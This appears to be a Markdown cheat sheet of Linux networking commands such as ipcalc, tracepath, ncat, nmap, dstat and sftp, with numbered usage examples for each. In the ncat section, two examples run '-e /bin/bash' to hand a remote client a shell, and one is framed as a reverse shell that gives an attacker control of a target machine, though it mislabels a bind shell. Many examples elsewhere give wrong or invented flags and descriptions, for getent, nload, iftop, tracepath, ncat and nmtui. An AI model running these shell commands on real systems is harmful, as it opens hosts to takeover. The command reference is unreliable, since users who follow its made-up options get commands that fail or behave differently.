`ipcalc` is a command-line tool that **calculates and displays IP address information**, including network, broadcast, netmask, and range, helping with subnetting and network planning.

### 1. Basic IP calculation

```bash
ipcalc 192.168.1.10/24
```

---

### 2. Specify IP and netmask separately

```bash
ipcalc 192.168.1.10 255.255.255.0
```

---

### 3. Show network and broadcast addresses only

```bash
ipcalc -n -b 192.168.1.10/24
```

---

### 4. Show all details with verbosity

```bash
ipcalc -v 192.168.1.10/24
```

---

### 5. Calculate CIDR notation from netmask

```bash
ipcalc 192.168.1.10 255.255.255.0
```

---

### 6. Display only network address

```bash
ipcalc -n 192.168.1.10/24
```

---

### 7. Display only broadcast address

```bash
ipcalc -b 192.168.1.10/24
```

---

### 8. Display only netmask

```bash
ipcalc -m 192.168.1.10/24
```

---

### 9. Display only wildcard mask

```bash
ipcalc -w 192.168.1.10/24
```

---

### 10. Display all in a single line

```bash
ipcalc -s 192.168.1.10/24
```

---

### 11. Calculate subnet from IP range

```bash
ipcalc 192.168.1.0/24 -s
```

---

### 12. Calculate multiple IPs at once

```bash
ipcalc 192.168.1.10/24 192.168.2.5/24
```

---

### 13. Show usable host range

```bash
ipcalc -u 192.168.1.10/24
```

---

### 14. Show all in concise output

```bash
ipcalc -cb 192.168.1.10/24
```

---

### 15. Combine options for network troubleshooting

```bash
ipcalc -n -b -m -s 192.168.1.10/24
```

---

### Common options (short)

```text
-n   network address
-b   broadcast address
-m   netmask
-w   wildcard mask
-s   single line summary
-u   usable host range
-v   verbose
-c   concise
```
</details>
<details>
<summary>tracepath</summary>

`tracepath` traces the network path from your machine to a destination host, showing each hop along the route and its latency, similar to `traceroute` but without requiring root privileges.

### 1. Basic tracepath to a host

```bash
tracepath example.com
```

---

### 2. Tracepath to an IP address

```bash
tracepath 8.8.8.8
```

---

### 3. Set maximum number of hops

```bash
tracepath -n example.com
```

> `-n` shows numeric IP addresses instead of hostnames.

---

### 4. Display numeric output only

```bash
tracepath -n 8.8.8.8
```

---

### 5. Tracepath to a host on a specific MTU

```bash
tracepath -m 1400 example.com
```

---

### 6. Use IPv4 only

```bash
tracepath -4 example.com
```

---

### 7. Use IPv6 only

```bash
tracepath -6 example.com
```

---

### 8. Combine numeric output with IPv4

```bash
tracepath -n -4 example.com
```

---

### 9. Combine numeric output with IPv6

```bash
tracepath -n -6 example.com
```

---

### 10. Tracepath for a local network host

```bash
tracepath 192.168.1.1
```

---

### 11. Tracepath and check MTU along the route

```bash
tracepath example.com
```

> Default behavior shows MTU changes per hop.

---

### 12. Tracepath and save output to a file

```bash
tracepath example.com > trace_output.txt
```

---

### 13. Tracepath with verbose output

```bash
tracepath -v example.com
```

---

### 14. Tracepath using a custom hop limit (not all versions)

```bash
tracepath --max-hops 20 example.com
```

---

### 15. Combine numeric, verbose, and IPv4

```bash
tracepath -n -v -4 example.com
```

---

### Common options (short)

```text
-n   numeric IP addresses
-4   force IPv4
-6   force IPv6
-m   set MTU
-v   verbose
--max-hops  set maximum hops (if supported)
```
</details>
<details>
<summary>ifstat</summary>

The `ifstat` command displays real-time network interface bandwidth usage (input/output) in a simple table format.

### **1. Basic usage (all interfaces)**

```bash
ifstat
```

Displays current network traffic (KB/s) for all interfaces.

---

### **2. Monitor a specific interface**

```bash
ifstat -i eth0
```

Only shows stats for `eth0`.

---

### **3. Set update interval**

```bash
ifstat 2
```

Updates every 2 seconds.

---

### **4. Show a limited number of updates**

```bash
ifstat 1 5
```

Displays stats every 1 second, 5 times.

---

### **5. Include timestamps**

```bash
ifstat -t
```

Shows current time along with traffic stats.

---

### **6. Display traffic in bytes instead of KB**

```bash
ifstat -b
```

Useful if you want exact byte counts.

---

### **7. Monitor multiple specific interfaces**

```bash
ifstat -i eth0,eth1
```

Shows stats only for `eth0` and `eth1`.

---

### **8. Show cumulative averages**

```bash
ifstat -a
```

Displays average traffic since the command started.

---

### **9. Change output format**

```bash
ifstat -n
```

Prevents headers from being repeated each interval (cleaner output).

---

### **10. Set custom width for columns**

```bash
ifstat -w 15
```

Adjusts column width for better readability.

---

### **11. Use kilobits instead of kilobytes**

```bash
ifstat -k
```

Shows traffic in kilobits/sec.

---

### **12. Combine timestamp with specific interface**

```bash
ifstat -t -i eth0
```

Timestamped stats for `eth0`.

---

### **13. Continuous monitoring for scripting**

```bash
ifstat -q 1
```

`-q` suppresses headers; useful for scripts, updates every 1 second.

---

### **14. Show all interfaces except loopback**

```bash
ifstat -i $(ls /sys/class/net | grep -v lo | tr '\n' ',')
```

Automatically excludes the loopback interface.

---

### **15. Output only averages at the end**

```bash
ifstat -a 2 5
```

Updates every 2 seconds, 5 times, then shows averages.
</details>
<details>
<summary>dnsdomainname</summary>

`dnsdomainname` command prints the DNS domain name of the host system

### **1. Basic usage**

```bash
dnsdomainname
```

Outputs the DNS domain name of the host (e.g., `example.com`).

---

### **2. Combined with `hostname` to get FQDN**

```bash
hostname -f
```

`dnsdomainname` alone gives the domain part, while `hostname -f` gives the full domain name including the host.

---

### **3. Using `dnsdomainname` in a script**

```bash
echo "My domain is: $(dnsdomainname)"
```

Prints a custom message with the domain name.

---

### **4. Check if domain is set**

```bash
[ -z "$(dnsdomainname)" ] && echo "No domain configured" || echo "Domain: $(dnsdomainname)"
```

Useful for system checks.

---

### **5. Store domain in a variable**

```bash
MYDOMAIN=$(dnsdomainname)
echo $MYDOMAIN
```

Can be used in automation scripts.

---

### **6. Combine with `hostname` to display host and domain**

```bash
echo "$(hostname).$(dnsdomainname)"
```

Outputs the full hostname with domain.

---

### **7. Use in conditional checks**

```bash
if [ "$(dnsdomainname)" = "example.com" ]; then echo "This is the production domain"; fi
```

Useful for server-specific scripts.

---

### **8. Combine with `awk` to extract parts**

```bash
dnsdomainname | awk -F. '{print $1}'
```

Prints the first segment of the domain name.

---

### **9. Verify domain in network troubleshooting**

```bash
ping $(dnsdomainname)
```

Can help verify DNS resolution in some setups.

---

### **10. Redirect output to a file**

```bash
dnsdomainname > /tmp/domain.txt
```

Stores the domain name for later use.

---

### **11. Using with `cut` to extract subdomain**

```bash
dnsdomainname | cut -d. -f2-
```

Prints everything except the first segment of the domain.

---

### **12. Combine with `nslookup`**

```bash
nslookup $(dnsdomainname)
```

Checks DNS records for the domain.

---

### **13. Use in a cron job to log domain**

```bash
* * * * * echo "$(date) - Domain: $(dnsdomainname)" >> /var/log/domain.log
```

Logs the domain name every minute (for monitoring purposes).

---

### **14. Use with `grep` to verify a substring**

```bash
dnsdomainname | grep "example"
```

Checks if the domain contains “example”.

---

### **15. Print domain along with IP address**

```bash
echo "$(dnsdomainname) $(hostname -I)"
```

Displays the domain and the host IP(s).
</details>
<details>
<summary>nmtui</summary>

`nmtui` command in Linux provides a text-based user interface for NetworkManager to manage network connections.

### **1. Launch `nmtui` main menu**

```bash
nmtui
```

Opens the main interactive text interface for managing connections.

---

### **2. Edit a network connection**

```bash
nmtui edit
```

Opens the interface to edit an existing network connection (IP, DNS, etc.).

---

### **3. Activate a network connection**

```bash
nmtui activate
```

Shows a list of available connections to activate.

---

### **4. Deactivate a connection**

```bash
nmtui deactivate
```

Lets you select an active connection to deactivate.

---

### **5. Set hostname interactively**

```bash
nmtui hostname
```

Allows you to set the system hostname through the text interface.

---

### **6. Use `nmtui` in a script-friendly way**

```bash
nmtui-connect
```

Provides a menu to connect to Wi-Fi networks directly.

---

### **7. Activate a connection by name (script)**

```bash
nmcli connection up <connection_name>
```

While `nmtui` is interactive, `nmcli` complements it for scripts.

---

### **8. Edit connection without GUI**

```bash
nmtui edit <connection_name>
```

Opens the editor directly for a specific connection.

---

### **9. Add a new connection**

```bash
nmtui add
```

Lets you create a new wired or wireless connection.

---

### **10. Quit `nmtui`**

While in `nmtui`, use arrow keys to select **Quit** or press `Esc` until the program exits.

---

### **11. Use arrow keys for navigation**

In any menu, navigate options, select **OK** or **Cancel**, and press `Enter` to confirm.

---

### **12. Change IP settings**

Inside `nmtui edit`:

* Select connection → **Edit**
* Set IP to static or dynamic (DHCP)
* Configure DNS, gateway, etc.

---

### **13. Connect to Wi-Fi**

Inside `nmtui`:

* Select **Activate a connection**
* Choose your Wi-Fi
* Enter password if required

---

### **14. Switch between connections**

Inside **Activate a connection**, you can deactivate the current one and activate another.

---

### **15. Combine `nmtui` and `nmcli` for status**

```bash
nmtui && nmcli device status
```

Use `nmtui` to make changes, then `nmcli` to verify network state.
</details>
<details>
<summary>ip addr</summary>

`ip addr` command in Linux is used to show and manage network interfaces and IP addresses. 

### **1. Show all network interfaces and their IP addresses**

```bash
ip addr
```

Displays a list of all network interfaces along with their IP addresses and related information.

---

### **2. Show a specific interface's details**

```bash
ip addr show eth0
```

Shows the IP address details for the `eth0` interface.

---

### **3. Show only IPv4 addresses**

```bash
ip -4 addr
```

Displays only the IPv4 addresses of the network interfaces.

---

### **4. Show only IPv6 addresses**

```bash
ip -6 addr
```

Displays only the IPv6 addresses of the network interfaces.

---

### **5. Display IP addresses of a specific interface**

```bash
ip addr show dev eth0
```

Displays the IP addresses associated with the `eth0` interface.

---

### **6. Display the IP address of a specific interface**

```bash
ip addr show dev eth0 | grep inet
```

Filters the output to show only the IPv4 address for `eth0`.

---

### **7. Display network interfaces with summary**

```bash
ip -brief addr
```

Displays a compact, summary view of all network interfaces and their IPs.

---

### **8. Display the MAC address of a specific interface**

```bash
ip addr show eth0 | grep link
```

Filters the output to show the MAC address of `eth0`.

---

### **9. Show details of interfaces with the `inet` keyword (for IPv4)**

```bash
ip addr show | grep inet
```

Displays only IPv4 addresses by filtering for the `inet` keyword.

---

### **10. Show a summary of the IP configuration of the system**

```bash
ip addr show
```

Provides detailed output, including interface names, IP addresses, and subnet masks.

---

### **11. Display IP address, subnet mask, and broadcast address**

```bash
ip addr show eth0
```

Shows IP, subnet, and broadcast address for `eth0`.

---

### **12. Display IP addresses with network prefixes**

```bash
ip addr show dev eth0 | grep inet
```

Shows the IP addresses of `eth0` with their network prefix (e.g., `192.168.1.10/24`).

---

### **13. Display all addresses, including loopback and inactive interfaces**

```bash
ip addr show
```

Shows all addresses, even if the interface is down (like `lo`).

---

### **14. Show addresses without interface names**

```bash
ip addr | grep inet | awk '{print $2}'
```

Displays only the IP addresses, omitting the interface names.

---

### **15. Display IP address of a specific interface with detailed information**

```bash
ip addr show eth0 | awk '/inet/ {print $2}'
```

Displays the IPv4 address of the `eth0` interface in a simpler format (`192.168.1.10/24`).
</details>
<details>
<summary>ncat</summary>

`ncat` is a command-line networking tool that comes with **Nmap** and can be used for reading and writing data across networks. It's often used for tasks such as port scanning, network troubleshooting, and secure connections. 

### **1. Basic usage (start a simple TCP server)**

```bash
ncat -l 12345
```

Starts a server that listens on TCP port 12345, allowing connections to be made to that port.

---

### **2. Connect to a remote server**

```bash
ncat example.com 80
```

Connects to `example.com` on port 80 (HTTP). This can be used to interact with web servers.

---

### **3. Set a specific address and port to listen on**

```bash
ncat -l 192.168.1.10 12345
```

Starts a listener on IP `192.168.1.10` and port `12345`.

---

### **4. Enable encryption (SSL/TLS) for the connection**

```bash
ncat --ssl example.com 443
```

Connects to `example.com` on port 443 using SSL/TLS encryption.

---

### **5. Start a simple chat server**

```bash
ncat -l 12345
```

Run this on one machine as a server, and then on another machine, connect using:

```bash
ncat <server_ip> 12345
```

This creates a simple two-way communication (chat) session.

---

### **6. Send a file to a remote machine**

```bash
ncat -l 12345 > received_file.txt
```

Start the listener to save the received file. Then, on another machine:

```bash
ncat <server_ip> 12345 < file_to_send.txt
```

This transfers `file_to_send.txt` to the remote server.

---

### **7. Use `ncat` for port scanning (scan a range of ports)**

```bash
ncat -z -v example.com 1-1000
```

Scans ports 1-1000 on `example.com`. The `-z` flag tells `ncat` to only scan without sending data, and `-v` enables verbose output.

---

### **8. Connect to a server and use it as a proxy**

```bash
ncat --proxy <proxy_ip>:<proxy_port> example.com 80
```

This connects to `example.com` on port 80, using the specified proxy.

---

### **9. Listen and display HTTP requests (web server simulation)**

```bash
ncat -l 8080
```

This starts a listener on port 8080 and displays any incoming HTTP requests sent to it.

---

### **10. Bind to an interface**

```bash
ncat -l -s 192.168.1.10 12345
```

This makes `ncat` bind to the IP address `192.168.1.10` while listening on port `12345`.

---

### **11. Limit incoming connection to a specific IP**

```bash
ncat -l 12345 --sh-execute "if [ \$SSH_CONNECTION != '192.168.1.50' ]; then exit; fi"
```

Only allows connections from IP `192.168.1.50` to connect to the listener.

---

### **12. Using `ncat` as a simple HTTP client**

```bash
echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | ncat example.com 80
```

Sends an HTTP GET request to `example.com` on port 80.

---

### **13. Listen for incoming connections and execute commands**

```bash
ncat -l -p 12345 -e /bin/bash
```

When a client connects to port 12345, it will execute `/bin/bash`, effectively giving the client shell access.

---

### **14. Use `ncat` with SOCKS proxy**

```bash
ncat --proxy-type socks5 --proxy <proxy_ip>:<proxy_port> example.com 80
```

Connects to `example.com` on port 80 using a SOCKS5 proxy.

---

### **15. Create a reverse shell**

On the target machine (listens for connection):

```bash
ncat -l 12345 -e /bin/bash
```

On the attacking machine (connects back to the target):

```bash
ncat <target_ip> 12345
```

This opens a reverse shell, giving the attacker control of the target machine.
</details>
<details>
<summary>systemctl restart network</summary>

`systemctl restart network` command in Linux is used to restart the network service, which can help apply changes to network configurations or troubleshoot connectivity issues. 

### **1. Restart the network service**

```bash
sudo systemctl restart network
```

This command restarts the entire network service. It can be used when you modify network configurations (e.g., `/etc/sysconfig/network-scripts/`).

---

### **2. Restart the network service on a specific interface (e.g., `eth0`)**

```bash
sudo systemctl restart network@eth0
```

This restarts only the network service for the specific interface `eth0`. The service is named as `network@<interface>` on many modern Linux distributions (like RHEL/CentOS).

---

### **3. Check the status of the network service**

```bash
sudo systemctl status network
```

Displays the current status of the `network` service, including whether it’s active, inactive, or failed.

---

### **4. Restart network service on a system with `NetworkManager`**

```bash
sudo systemctl restart NetworkManager
```

If your system is using `NetworkManager` instead of the traditional network service, this will restart it and reapply any changes to network configurations.

---

### **5. Restart the network service on a specific interface using `nmcli`**

```bash
sudo nmcli connection reload
```

For systems using `NetworkManager`, this command reloads the network configurations of all active connections without needing to restart the entire service.

---

### **6. Restart network service and view logs (for troubleshooting)**

```bash
sudo systemctl restart network && journalctl -xe | grep network
```

This restarts the network service and immediately shows any relevant logs from `journalctl` related to networking, which is useful for troubleshooting.

---

### **7. Disable automatic startup of the network service**

```bash
sudo systemctl disable network
```

Disables the network service from starting automatically on boot.

---

### **8. Enable automatic startup of the network service**

```bash
sudo systemctl enable network
```

Enables the network service to start automatically at boot time.

---

### **9. Stop the network service**

```bash
sudo systemctl stop network
```

Stops the network service. Useful if you need to temporarily disable networking, but be cautious as this will disrupt your network connectivity.

---

### **10. Start the network service after it has been stopped**

```bash
sudo systemctl start network
```

Starts the network service if it was previously stopped.

---

### **11. Restart network service and reapply DNS settings**

If you change `/etc/resolv.conf` or DNS settings, you may need to restart the network service for changes to take effect:

```bash
sudo systemctl restart network
```

---

### **12. Restart the network service and check IP addresses**

After restarting the network service, you can check the new IP addresses assigned to interfaces:

```bash
sudo systemctl restart network && ip addr
```

This shows the IP addresses after restarting the network service.

---

### **13. Restart network service and test connectivity**

After making network changes, restart the service and then test connectivity using `ping`:

```bash
sudo systemctl restart network && ping -c 4 google.com
```

Pings `google.com` to ensure that the network service is working properly after a restart.

---

### **14. Restart network and apply static IP changes**

If you've modified static IP configuration files (e.g., `/etc/sysconfig/network-scripts/ifcfg-eth0`), restart the network service:

```bash
sudo systemctl restart network
```

This applies the changes to your static IP configuration.

---

### **15. Restart network on a system with `systemd` networking**

```bash
sudo systemctl restart systemd-networkd
```

For systems using `systemd-networkd`, this command restarts the network service managed by `systemd`.
</details>
<details>
<summary>iftop</summary>

`iftop` command in Linux is used to display bandwidth usage on an interface, providing real-time network monitoring. It is useful for troubleshooting network issues or identifying bandwidth-heavy processes. 

### **1. Display bandwidth usage on the default interface**

```bash
sudo iftop
```

This command shows a real-time view of bandwidth usage on the default network interface (typically `eth0` or `ens33`).

---

### **2. Monitor a specific network interface**

```bash
sudo iftop -i eth0
```

Monitor bandwidth usage specifically on the `eth0` interface.

---

### **3. Display bandwidth in bits per second**

```bash
sudo iftop -B
```

This option changes the default display from bytes to bits per second.

---

### **4. Set a custom update interval**

```bash
sudo iftop -t 2
```

This updates the display every 2 seconds. The default is 1 second.

---

### **5. Show bandwidth for both incoming and outgoing traffic**

```bash
sudo iftop -ni eth0
```

Shows both incoming and outgoing traffic on interface `eth0`.

---

### **6. Limit display to a specific host**

```bash
sudo iftop -f "host 192.168.1.10"
```

This filters the output to show traffic only from or to `192.168.1.10`.

---

### **7. Show traffic by port**

```bash
sudo iftop -F "port 80"
```

This displays traffic for port 80, commonly used by HTTP. Useful for monitoring web traffic.

---

### **8. Use `iftop` with port filtering**

```bash
sudo iftop -F "port 443"
```

Shows bandwidth usage for port 443 (HTTPS).

---

### **9. Show a more detailed output**

```bash
sudo iftop -ni eth0 -P
```

With the `-P` option, `iftop` displays more detailed information about connections, including port numbers.

---

### **10. Show traffic for both IPv4 and IPv6**

```bash
sudo iftop -6
```

Display both IPv6 and IPv4 traffic.

---

### **11. Display in a more compact format**

```bash
sudo iftop -n
```

Prevents hostname resolution and shows IP addresses directly, providing a faster, more compact output.

---

### **12. Set a threshold for bandwidth usage**

```bash
sudo iftop -t 1 -s 20
```

This sets a 1-second interval for the display and will show traffic for a total of 20 seconds.

---

### **13. Show traffic for a specific network range**

```bash
sudo iftop -f "net 192.168.1.0/24"
```

Filters the output to show traffic for the entire subnet `192.168.1.0/24`.

---

### **14. Sort by connections with the highest bandwidth usage**

```bash
sudo iftop -nP -s 60
```

Sorts by connections with the highest bandwidth usage for 60 seconds, giving you a snapshot of heavy traffic sources.

---

### **15. Show traffic with a specific protocol (e.g., TCP)**

```bash
sudo iftop -f "tcp"
```

Displays only TCP traffic. This is useful if you're only interested in certain protocols (e.g., HTTP or FTP).
</details>
<details>
<summary>nload</summary>

`nload` command in Linux is a tool used to monitor network bandwidth usage in real-time. It displays incoming and outgoing traffic separately, making it useful for network diagnostics and monitoring. 

### **1. Basic usage (monitor default interface)**

```bash
sudo nload
```

Displays a real-time graph of incoming and outgoing network traffic on the default interface.

---

### **2. Monitor a specific network interface**

```bash
sudo nload eth0
```

Monitors the traffic on the `eth0` interface. Replace `eth0` with your desired interface (e.g., `wlan0` for wireless).

---

### **3. Display traffic in a specific unit (e.g., KB, MB)**

```bash
sudo nload -u M
```

Displays the traffic in megabytes per second (MB/s). You can also use `K` for kilobytes (KB/s), `M` for megabytes (MB/s), or `G` for gigabytes (GB/s).

---

### **4. Show traffic for both incoming and outgoing on separate graphs**

```bash
sudo nload -i eth0
```

Displays two separate graphs for incoming and outgoing traffic on the `eth0` interface.

---

### **5. Monitor multiple interfaces at once**

```bash
sudo nload eth0 wlan0
```

Shows real-time traffic graphs for both the `eth0` and `wlan0` interfaces simultaneously.

---

### **6. Change the refresh interval (e.g., update every 2 seconds)**

```bash
sudo nload -t 2
```

This updates the display every 2 seconds. The default refresh interval is 500ms.

---

### **7. Disable the display of the graph (numeric only)**

```bash
sudo nload -g
```

Only displays the numeric values for incoming and outgoing traffic without the graphical representation.

---

### **8. Show only the incoming or outgoing traffic**

```bash
sudo nload -i eth0 -t 2 -o
```

Shows only outgoing traffic for `eth0` with a 2-second update interval.

---

### **9. Save traffic data to a file**

While `nload` doesn't have a direct option to log output to a file, you can use the `tee` command to save the output:

```bash
sudo nload -t 2 | tee nload_output.txt
```

Saves the output to `nload_output.txt` while displaying it in real-time.

---

### **10. Monitor a specific network range**

```bash
sudo nload -f "192.168.1.0/24"
```

This filters and shows traffic for a specific subnet (e.g., `192.168.1.0/24`).

---

### **11. Display traffic with an additional graph showing total traffic**

```bash
sudo nload -p
```

Shows the total traffic in addition to the incoming and outgoing traffic graphs.

---

### **12. Monitor traffic without showing the interface names**

```bash
sudo nload -n
```

This hides the interface names, only showing the graphs for traffic (useful for minimal display).

---

### **13. Change the graph resolution (e.g., use a smaller graph)**

```bash
sudo nload -s 5
```

This reduces the resolution of the graph, making it smaller. You can adjust the value to get a finer or coarser resolution.

---

### **14. Enable scrolling for large traffic spikes**

```bash
sudo nload -S
```

Enables scrolling in the traffic graph to handle large spikes and provides a smoother view.

---

### **15. Set maximum download/upload rate display**

```bash
sudo nload -l 1000
```

This limits the display of maximum traffic to 1000 KB/s. Useful if you want to focus on lower bandwidth usage.
</details>
<details>
<summary>dstat</summary>

`dstat` is a versatile tool in Linux that provides real-time system resource statistics, including CPU, disk, network, and memory usage. It's especially useful for performance monitoring and troubleshooting. 

### **1. Basic usage**

```bash
dstat
```

Displays a basic summary of CPU, disk, and network usage in real-time. Updates every second by default.

---

### **2. Monitor CPU, memory, and disk activity**

```bash
dstat -c -m -d
```

Shows real-time stats for CPU usage (`-c`), memory usage (`-m`), and disk activity (`-d`).

---

### **3. Monitor CPU, memory, and network activity**

```bash
dstat -c -m -n
```

Displays CPU, memory, and network interface statistics.

---

### **4. Monitor disk read/write activity**

```bash
dstat -d
```

Shows disk read/write activity. Useful for analyzing disk performance.

---

### **5. Show network traffic for all interfaces**

```bash
dstat -n
```

Shows the incoming and outgoing network traffic for all network interfaces.

---

### **6. Monitor system load and I/O**

```bash
dstat -l -d
```

Displays system load and disk I/O activity.

---

### **7. Display extended information about network stats**

```bash
dstat -n --net-packets
```

Shows both network traffic and packet information (e.g., packets sent/received).

---

### **8. Monitor memory usage and swap**

```bash
dstat -m -S swap
```

Shows memory usage and swap statistics in real-time.

---

### **9. Show disk usage per device**

```bash
dstat -d --disk-util
```

Displays disk usage per device, including I/O utilization.

---

### **10. Show CPU statistics with detailed breakdown**

```bash
dstat -c --cpu-adv
```

Shows advanced CPU stats, breaking down usage into user, system, idle, etc.

---

### **11. Monitor disk usage per file system**

```bash
dstat -D total
```

Displays total disk activity for all mounted file systems.

---

### **12. Monitor processes and system load**

```bash
dstat -p -l
```

Shows process stats alongside system load, providing insight into running processes.

---

### **13. Monitor I/O and network activity with timestamp**

```bash
dstat -t -d -n
```

Displays timestamped information for both I/O and network activity.

---

### **14. Monitor system uptime, load, and memory**

```bash
dstat -t -l -m
```

Shows the timestamp, system load, and memory usage in a single output.

---

### **15. Custom time interval (e.g., every 5 seconds)**

```bash
dstat 5
```

Displays system statistics every 5 seconds instead of the default 1-second interval.

---

### **16. Monitor disk usage with detailed output**

```bash
dstat -d --disk-tps --disk-async
```

Shows disk transfers per second (`--disk-tps`) and asynchronous disk operations (`--disk-async`).

---

### **17. Show system-wide disk and network usage**

```bash
dstat -d -n
```

Displays both disk and network statistics together for a comprehensive view.

---

### **18. Monitor the system’s power usage (if supported)**

```bash
dstat -P
```

Shows power usage statistics for systems with power sensors.

---

### **19. Show stats for a specific process (e.g., PID 1234)**

```bash
dstat -p 1234
```

Monitors system statistics specifically for the process with PID `1234`.

---

### **20. Show statistics in a CSV format**

```bash
dstat -c -n --output /tmp/dstat_output.csv
```

Saves the CPU and network stats into a CSV file for later analysis.

---

### **21. Show stats for specific devices**

```bash
dstat -d /dev/sda
```

Shows disk statistics for a specific device (`/dev/sda` in this case).
</details>
<details>
<summary>getent hosts</summary>

The `getent hosts` command in Linux is used to retrieve the hostname-to-IP address mapping from system databases like `/etc/hosts`, DNS, and other network name resolution services (such as NIS or LDAP). It queries the Name Service Switch (NSS) for the hostname information.

### **1. Get the IP address of a hostname**

```bash
getent hosts example.com
```

This will display the IP address of `example.com` by querying the system's configured name resolution service (e.g., DNS).

---

### **2. Get the IP address of a local hostname**

```bash
getent hosts localhost
```

This retrieves the IP address of the local machine, typically `127.0.0.1` (IPv4) or `::1` (IPv6), depending on the configuration.

---

### **3. Get the IP address and associated hostname**

```bash
getent hosts 192.168.1.10
```

This will display the hostname(s) associated with the IP address `192.168.1.10`. If it’s a local machine, it might show something like `myhostname 192.168.1.10`.

---

### **4. Get the IP address of a local network machine**

```bash
getent hosts myserver.local
```

This will return the IP address of the host `myserver.local`, assuming that the `.local` domain is resolvable (commonly used in mDNS/Bonjour setups).

---

### **5. Display the hosts database**

```bash
getent hosts
```

This will display all the hostnames and their corresponding IP addresses from the system’s configured databases (`/etc/hosts`, DNS, etc.).

---

### **6. Query DNS (specifically)**

```bash
getent hosts -d example.com
```

While `getent` will normally query all available services (e.g., `/etc/hosts`, DNS, NIS), this can be used to check DNS resolution for `example.com`.

---

### **7. Get IP address of a host using a specific interface's DNS configuration**

```bash
getent hosts example.com @8.8.8.8
```

Queries the Google DNS server (`8.8.8.8`) to resolve `example.com`, bypassing the default resolver.

---

### **8. Resolve a hostname from `/etc/hosts`**

```bash
getent hosts myhost
```

If `myhost` is listed in your local `/etc/hosts` file, this will return its associated IP address.

---

### **9. Combine `getent` with `grep` to filter specific hosts**

```bash
getent hosts | grep example.com
```

This filters the results to only show entries related to `example.com`.

---

### **10. Show detailed information (including aliases) for a hostname**

```bash
getent hosts example.com | awk '{print $1}'
```

This extracts and prints only the IP address associated with `example.com` (the first column).

---

### **11. Query for a specific domain**

```bash
getent hosts mydomain.com
```

Resolves the IP address for a hostname in `mydomain.com` using the system’s name resolution configuration.

---

### **12. Query an IP address directly for any associated hostnames**

```bash
getent hosts 192.168.1.20
```

This resolves `192.168.1.20` to any hostname or alias associated with that IP address.

---

### **13. Query multiple hosts**

```bash
getent hosts example.com myserver.local
```

This retrieves IP addresses for multiple hosts in one command.

---

### **14. Use `getent` to troubleshoot name resolution**

```bash
getent hosts google.com
```

If DNS or other name resolution services are not working as expected, this command can help troubleshoot if the host can be resolved properly.

---

### **15. Query a network subnet range**

```bash
getent hosts 192.168.1.0/24
```

This will return any hosts in the specified subnet if the system is configured to resolve that range.
</details>
<details>
<summary>nmap</summary>

`nmap` is a Linux command-line tool used to scan networks and systems to discover active hosts, open ports, running services, and operating system details.


1. Scan a single host

```bash
nmap 192.168.1.1
```

2. Scan multiple hosts

```bash
nmap 192.168.1.1 192.168.1.10
```

3. Scan an entire subnet

```bash
nmap 192.168.1.0/24
```

4. Scan a domain name

```bash
nmap example.com
```

5. Scan specific ports

```bash
nmap -p 22,80,443 192.168.1.1
```

6. Scan a range of ports

```bash
nmap -p 1-1000 192.168.1.1
```

7. Scan all ports

```bash
nmap -p- 192.168.1.1
```

8. Fast scan (top common ports)

```bash
nmap -F 192.168.1.1
```

9. Service and version detection

```bash
nmap -sV 192.168.1.1
```

10. Default script scan

```bash
nmap -sC 192.168.1.1
```

11. Aggressive scan (OS, version, scripts)

```bash
nmap -A 192.168.1.1
```

12. OS detection (requires root)

```bash
sudo nmap -O 192.168.1.1
```

13. TCP SYN scan

```bash
sudo nmap -sS 192.168.1.1
```

14. UDP scan

```bash
sudo nmap -sU 192.168.1.1
```

15. Save scan output to a file

```bash
nmap -oN output.txt 192.168.1.1
```
</details>
<details>
<summary>mtr</summary>

`mtr` (My Traceroute) is a network diagnostic command that combines ping and traceroute to show real-time path, latency, and packet loss to a destination.

### 1. Basic interactive mode

Continuously shows route and packet loss to a host.

```bash
mtr google.com
```

---

### 2. Use IP addresses instead of hostnames

Disables DNS lookup for faster results.

```bash
mtr -n google.com
```

---

### 3. Report mode (non-interactive)

Runs and prints a final report, useful for logs.

```bash
mtr -r google.com
```

---

### 4. Send a fixed number of packets

Runs 10 probes and exits.

```bash
mtr -c 10 google.com
```

---

### 5. Report mode with packet count

Combines report mode with 20 packets.

```bash
mtr -r -c 20 google.com
```

---

### 6. Wide report format

Prevents line wrapping for long hostnames.

```bash
mtr -r -w google.com
```

---

### 7. TCP instead of ICMP

Useful when ICMP is blocked by firewalls.

```bash
mtr -T google.com
```

---

### 8. UDP mode

Uses UDP packets instead of ICMP.

```bash
mtr -u google.com
```

---

### 9. Specify destination port (TCP)

Checks connectivity to a specific service port.

```bash
mtr -T -P 443 google.com
```

---

### 10. Set packet size

Sends packets of 100 bytes.

```bash
mtr -s 100 google.com
```

---

### 11. Change interval between probes

Sends a probe every 2 seconds.

```bash
mtr -i 2 google.com
```

---

### 12. Limit maximum hops

Stops after 15 hops.

```bash
mtr -m 15 google.com
```

---

### 13. Show MPLS labels (if supported)

Helpful for ISP-level troubleshooting.

```bash
mtr --mpls google.com
```

---

### 14. Output in CSV format

Useful for scripting or importing into tools.

```bash
mtr -r --csv google.com
```

---

### 15. Run quietly with report mode

Suppresses interactive display.

```bash
mtr -r -q google.com
```
</details>
<details>
<summary>sftp</summary>

## Connect to an SFTP server

```bash
sftp user@host
```

With a custom port:

```bash
sftp -P 2222 user@host
```

Using an identity (SSH key):

```bash
sftp -i ~/.ssh/id_rsa user@host
```

---

## Basic navigation (inside sftp prompt)

```bash
pwd            # show remote working directory
lpwd           # show local working directory
ls             # list remote files
lls            # list local files
cd /remote/dir
lcd /local/dir
```

---

## Upload files

Upload one file:

```bash
put file.txt
```

Upload with a different remote name:

```bash
put local.txt remote.txt
```

Upload multiple files:

```bash
put file1.txt file2.txt
```

Upload a directory recursively:

```bash
put -r myfolder
```

---

## Download files

Download one file:

```bash
get file.txt
```

Download with a different local name:

```bash
get remote.txt local.txt
```

Download multiple files:

```bash
get file1.txt file2.txt
```

Download a directory recursively:

```bash
get -r myfolder
```

---

## File management (remote)

```bash
mkdir newdir
rmdir emptydir
rm file.txt
rename oldname.txt newname.txt
chmod 644 file.txt
```

---

## File management (local, from sftp)

```bash
lmkdir localdir
lrmdir localdir
lrm file.txt
```

---

## Check transfer progress and size

```bash
df             # remote disk usage
stat file.txt  # remote file info
```

---

## Non-interactive (one-liner) usage

Upload a file:

```bash
sftp user@host:/remote/dir <<< $'put file.txt'
```

Download a file:

```bash
sftp user@host:/remote/dir <<< $'get file.txt'
```

Batch mode with a script:

```bash
sftp user@host <<EOF
cd /remote/dir
put file.txt
get other.txt
bye
EOF
```

---

## Exit SFTP

